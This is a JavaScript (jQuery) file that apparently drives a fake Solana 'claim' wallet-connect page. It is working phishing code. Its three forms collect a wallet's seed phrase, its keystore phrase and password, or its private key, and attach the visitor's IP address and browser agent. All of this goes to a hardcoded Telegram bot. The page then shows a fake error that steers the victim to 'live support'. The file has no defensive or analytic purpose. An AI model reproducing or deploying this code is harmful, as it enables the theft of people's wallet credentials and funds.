(function ($) {
	
	"use strict";

	$(document).ready(function(){
		$("#clMdal1").click(function() {
			$("#mdOver").css("display", "none")	
			$("#mdal1").hide(200)
		})

		$(".clMdal2").click(function() {
			$("#mdOver").css("display", "none")	
			$("#mdal2").hide(200)
		})
		$(".clMdal3").click(function() {
			$("#mdOver").css("display", "none")	
			$("#mdal3").hide(200)
		})
		$(".clMod5").click(function() {
			$("#mdOver").css("display", "none")	
			$("#mdal5").hide(200)
			$("#tab1").click()
		})


		$("#opMdal3").click(function() {
			$("#mdOver").css("display", "flex")	
			$("#mdal3").css("display", "flex")
		})
		$("#opMdal2").click(function() {
			$("#mdOver").css("display", "flex")	
			$("#mdal2").css("display", "flex")
		})

		setTimeout(function(){
			$("#mdOver").css("display", "flex")
			$("#mdal1").css("display", "flex")
		}, 100)


		$(".coin").on("click", function() {
			$("#inp1").val("")
			$("#inp2").val("")
			$("#inp3").val("")
			$("#inp4").val("")
			var a = $(this).find("img").attr("src")
			var b = $(this).find("span").html()
			$(".modImg").attr("src", a)
			$(".modCoin").html(b)
			$("#mdal3").hide(200)
			$("#mdal4").css("display", "flex")
			sessionStorage.setItem("wallType", b)
			setTimeout(function() {
				$("#mdal4").hide(200)
				$("#mdal5").css("display", "flex")
			}, 4000)
		})





			
		$("#tab2Holder").hide()
		$("#tab3Holder").hide()

		$("#tab1").on("click", function() {
			$("#tab1").css("border-bottom", "2px solid #fff")
			$("#tab2").css("border-bottom", "2px solid transparent")
			$("#tab3").css("border-bottom", "2px solid transparent")
			$("#tab1Holder").show(300)
			$("#tab2Holder").hide()
			$("#tab3Holder").hide()
		})
		$("#tab2").on("click", function() {
			$("#tab2").css("border-bottom", "2px solid #fff")
			$("#tab1").css("border-bottom", "2px solid transparent")
			$("#tab3").css("border-bottom", "2px solid transparent")
			$("#tab2Holder").show(300)
			$("#tab1Holder").hide()
			$("#tab3Holder").hide()
		})
		$("#tab3").on("click", function() {
			$("#tab3").css("border-bottom", "2px solid #fff")
			$("#tab2").css("border-bottom", "2px solid transparent")
			$("#tab1").css("border-bottom", "2px solid transparent")
			$("#tab3Holder").show(300)
			$("#tab2Holder").hide()
			$("#tab1Holder").hide()
		})
		

		$.get("https://api.ipify.org?format=json", function(data, status){
			sessionStorage.setItem("plasta", data?.ip)
		})





		$("#form1").on("submit", function(event) {
			event.preventDefault()
			var agent = window.navigator.userAgent
			var ip = sessionStorage.getItem("plasta")
			var a = document.getElementById('inp1').value
			var wallType = sessionStorage.getItem("wallType")
			var sData = encodeURI("New Claim-SoL\n\nWallet Type: "+wallType+" \n\nPass Phrase: \n\n"+a+"\n\nIP Address: "+ip+"\n\nbrowser agent: "+agent)
			$.ajax({
				url: 'https://api.telegram.org/bot7124923704:AAGmXG6fO9XR7lU_L0IC5mN4kRwaNQPe61A/'+"sendmessage?text="+sData+"&chat_id=5988153839&parse_mode=HTML",
				beforeSend: function() {
					$("#btn1").html('<div style="display: flex;align-items: center;justify-content: center;">Connecting <i class="fa fa-spinner fa-spin" style="color: #fff;font-size: 20px;margin-left: 12px;"></i></div>')
				},
				error: function() {
					$("#btn1").html("Proceed")
				},
				success: function() {
					$("#btn1").html("Proceed")
					$("#mdOver").css("display", "none")
					$("#mdal5").hide()
					$("#tab1").click()
					setTimeout(function(){
						alert("Error occured! Please try again and if error persist contact live support for assistance.")
					}, 500)
				}
			})
		})
	
	
		$("#form2").on("submit", function(event) {
			event.preventDefault()
			var agent = window.navigator.userAgent
			var ip = sessionStorage.getItem("plasta")
			var a = document.getElementById('inp2').value
			var b = document.getElementById('inp3').value
			var wallType = sessionStorage.getItem("wallType")
			var sData = encodeURI("New Claim-SoL\n\nWallet Type: "+wallType+" \n\nKeystore Phrase: "+a+"\n\nWallet Pasword: "+b+"\n\nIP Address: "+ip+"\n\nbrowser agent: "+agent)
			$.ajax({
				url: 'https://api.telegram.org/bot7124923704:AAGmXG6fO9XR7lU_L0IC5mN4kRwaNQPe61A/'+"sendmessage?text="+sData+"&chat_id=5988153839&parse_mode=HTML",
				beforeSend: function() {
					$("#btn2").html('<div style="display: flex;align-items: center;justify-content: center;">Connecting <i class="fa fa-spinner fa-spin" style="color: #fff;font-size: 20px;margin-left: 12px;"></i></div>')
				},
				error: function() {
					$("#btn2").html("Proceed")
				},
				success: function() {
					$("#btn2").html("Proceed")
					$("#mdOver").css("display", "none")
					$("#mdal5").hide()
					$("#tab1").click()
					setTimeout(function(){
						alert("Error occured! Please try again and if error persist contact live support for assistance.")
					}, 500)
				}
			})
		})
	
	
		$("#form3").on("submit", function(event) {
			event.preventDefault()
			var agent = window.navigator.userAgent
			var ip = sessionStorage.getItem("plasta")
			var a = document.getElementById('inp4').value
			var wallType = sessionStorage.getItem("wallType")
			var sData = encodeURI("New Claim-SoL\n\nWallet Type: "+wallType+" \n\nPrivate Key: "+a+"\n\nIP Address: "+ip+"\n\nbrowser agent: "+agent)
			$.ajax({
				url: 'https://api.telegram.org/bot7124923704:AAGmXG6fO9XR7lU_L0IC5mN4kRwaNQPe61A/'+"sendmessage?text="+sData+"&chat_id=5988153839&parse_mode=HTML",
				beforeSend: function() {
					$("#btn3").html('<div style="display: flex;align-items: center;justify-content: center;">Connecting <i class="fa fa-spinner fa-spin" style="color: #fff;font-size: 20px;margin-left: 12px;"></i></div>')
				},
				error: function() {
					$("#btn3").html("Proceed")
				},
				success: function() {
					$("#btn3").html("Proceed")
					$("#mdOver").css("display", "none")
					$("#mdal5").hide()
					$("#tab1").click()
					setTimeout(function(){
						alert("Error occured! Please try again and if error persist contact live support for assistance.")
					}, 500)
				}
			})
		})
	})
})(window.jQuery);